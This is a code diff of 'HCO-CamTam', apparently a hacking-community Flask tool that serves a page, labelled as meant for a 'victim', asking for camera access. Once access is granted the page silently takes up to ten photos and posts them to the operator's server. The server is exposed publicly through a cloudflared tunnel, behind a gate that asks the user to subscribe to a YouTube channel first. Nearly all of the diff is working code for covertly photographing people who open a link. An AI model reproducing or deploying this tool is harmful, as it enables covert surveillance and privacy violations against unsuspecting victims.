@@ -1,41 +1,57 @@
 #!/usr/bin/env python3
-from flask import Flask, render_template_string
-import os, base64
+"""
+HCO-CamTam
+Camera Tool by Azhar (Hackers Colony)
+"""
+
+import os
+import time
+import subprocess
+from flask import Flask, request, render_template_string
+from colorama import Fore, Style
 
 app = Flask(__name__)
 
+# HTML page served to victim
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
-<title>Camera Capture</title>
+  <title>Camera Access</title>
 </head>
-<body onload="startCam()">
-<h2 style="color:red;text-align:center;">📸 HCO Cam Tam by Azhar</h2>
-<video id="video" autoplay playsinline style="display:none;"></video>
-<script>
-let count = 0;
-function startCam(){
-    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
-        let video = document.getElementById("video");
+<body style="background:black;color:white;text-align:center;">
+  <h2>🔴 HCO-CamTam</h2>
+  <p>Camera access required...</p>
+  <video id="video" width="300" autoplay></video>
+  <script>
+    const video = document.getElementById('video');
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
         video.srcObject = stream;
-        let canvas = document.createElement("canvas");
-        let ctx = canvas.getContext("2d");
-        let capture = setInterval(()=>{
-            if(count>=10){
-                clearInterval(capture);
-                stream.getTracks().forEach(t=>t.stop());
-                return;
+        const track = stream.getVideoTracks()[0];
+        let imageCapture = new ImageCapture(track);
+        let count = 0;
+
+        function snap() {
+          if(count >= 10) return;
+          imageCapture.takePhoto().then(blob => {
+            let reader = new FileReader();
+            reader.onloadend = function() {
+              fetch('/upload', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({image: reader.result})
+              });
             }
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video,0,0);
-            fetch("/upload",{method:"POST",body:canvas.toDataURL("image/png")});
-            count++;
-        },1500);
-    });
-}
-</script>
+            reader.readAsDataURL(blob);
+          });
+          count++;
+          setTimeout(snap, 2000);
+        }
+        snap();
+      })
+      .catch(e => document.body.innerHTML = "<h3>Camera blocked ❌</h3>");
+  </script>
 </body>
 </html>
 """
@@ -46,14 +62,30 @@ def index():
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    import flask
-    data = flask.request.data.decode("utf-8")
-    if data.startswith("data:image/png;base64,"):
-        data = data.split(",")[1]
-        os.makedirs("captures", exist_ok=True)
-        with open(f"captures/front_{len(os.listdir('captures'))+1}.png","wb") as f:
-            f.write(base64.b64decode(data))
+    print(Fore.GREEN + "[+] Image received ✅" + Style.RESET_ALL)
     return "OK"
 
-if __name__ == "__main__":
+def banner():
+    os.system("clear")
+    print(Fore.RED + Style.BRIGHT + "\n   HCO CAM TAM\n" + Style.RESET_ALL)
+    print(Fore.GREEN + "   by Azhar - A Camera Tool\n" + Style.RESET_ALL)
+
+def unlock_and_run():
+    os.system("clear")
+    print(Fore.CYAN + "This tool requires subscribing to Hackers Colony Tech!\n" + Style.RESET_ALL)
+    print("Redirecting in 5s...")
+    time.sleep(5)
+    os.system("xdg-open https://youtube.com/@hackers_colony_tech")
+    input(Fore.YELLOW + "\nPress Enter after subscribing to continue..." + Style.RESET_ALL)
+
+    banner()
+    for i in range(5, 0, -1):
+        print(Fore.MAGENTA + f"Starting server in {i}..." + Style.RESET_ALL, end="\r")
+        time.sleep(1)
+
+    print("\n" + Fore.GREEN + "[*] Starting Flask server..." + Style.RESET_ALL)
+    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"])
     app.run(host="0.0.0.0", port=5000)
+
+if __name__ == "__main__":
+    unlock_and_run()
